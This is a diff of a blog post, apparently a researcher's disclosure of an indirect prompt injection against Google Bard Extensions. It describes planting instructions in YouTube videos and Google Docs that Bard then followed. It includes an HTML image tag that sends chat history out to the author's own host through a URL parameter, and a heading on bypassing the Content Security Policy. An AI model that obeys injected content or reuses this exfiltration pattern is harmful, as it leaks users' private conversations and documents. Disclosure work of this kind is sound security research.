@@ -145,7 +145,8 @@
   <section>
     <p>Recently Google Bard got some <a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">powerful updates</a>, including Extensions. Extensions allow Bard to access YouTube, search for flights and hotels, and also to access a user&rsquo;s personal documents and emails.</p>
 <p><strong>So, Bard can now access and analyze your Drive, Docs and Gmail!</strong></p>
-<p>When <code>Extensions</code> shipped I was able to quickly validate that Indirect Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with <code>Google Docs</code>.</p>
+<p>This means that it analyzes untrusted data and will be susceptible to Indirect Prompt Injection.</p>
+<p>I was able to quickly validate that Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with <code>Google Docs</code>.</p>
 <p>Turns out that it followed the instructions:</p>
 <p><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845"><img src="/blog/images/2023/google-bard-pi.png" alt="Google Bard Prompt Injection Demo"></a></p>
 <p>At that point it was clear that things will become a lot more interesting.</p>
@@ -164,6 +165,7 @@
 <pre tabindex="0"><code>&lt;img src=&quot;https://wuzzi.net/logo.png?goog=[DATA_EXFILTRATION]&quot;&gt;
 </code></pre><p>The browser will automatically connect to the URL without user interaction to load the image.</p>
 <p>Using the power of the LLM we can summarize or access previous data in the chat context and append it accordingly to the URL.</p>
+<p><a href="/blog/images/2023/bard-exfil-logo.png"><img src="/blog/images/2023/bard-exfil-logo.png" alt="Google Bard Data Exfil"></a></p>
 <p>When writing the exploit a prompt injection payload was quickly developed that would read the history of the conversation, and form a hyperlink that contained it.</p>
 <p>However image rendering was blocked by Google&rsquo;s Content Security Policy.</p>
 <h2 id="content-security-policy-bypass">Content Security Policy Bypass</h2>
@@ -240,6 +242,7 @@
 <li><a href="https://blog.google/products/bard/google-bard-new-features-update-sept-2023/">Google Bard Extension Announcment</a>,</li>
 <li><a href="https://twitter.com/wunderwuzzi23/status/1704198612039737845">Indirect Prompt Injections with Google Bard</a></li>
 <li><a href="https://ekoparty.org/eko2023-agenda/indirect-prompt-injections-in-the-wild-real-world-exploits-and-mitigations/">Ekoparty 2023 Prompt Injection Talk</a></li>
+<li>Google Bard - Data Exfil image was created with DALLE-3</li>
 </ul>
 <h2 id="appendix">Appendix</h2>
 <p>Full Prompt Injection in the Google Doc:</p>
